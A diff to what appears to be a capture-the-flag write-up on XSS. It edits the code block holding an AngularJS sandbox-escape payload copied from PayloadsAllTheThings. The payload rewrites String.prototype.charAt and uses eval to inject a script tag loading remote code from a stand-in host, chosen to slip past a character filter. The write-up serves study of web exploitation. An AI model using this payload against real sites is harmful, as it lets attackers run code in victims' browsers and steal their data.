@@ -63,10 +63,8 @@ The payload should consist an iframe which contains a script tag that loads the 
 After a long time searching (and missing the obvious payload), I decided on a payload shown in a GitHub repository [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md). 
 
 ```javascript
-{{
-    a=toString().constructor.prototype;a.charAt=a.trim;
-    $eval('a,eval(`var _=document.createElement(\'script\');_.src=\'//localhost/m\';document.body.appendChild(_);`),a')
-}}
+a=toString().constructor.prototype;a.charAt=a.trim;
+$eval('a,eval(`var _=document.createElement(\'script\');_.src=\'//localhost/m\';document.body.appendChild(_);`),a')
 ```
 
 This payload is ideal as it consists of the least number of bad characters as predetermined by `/broadcasts/frame.js`.
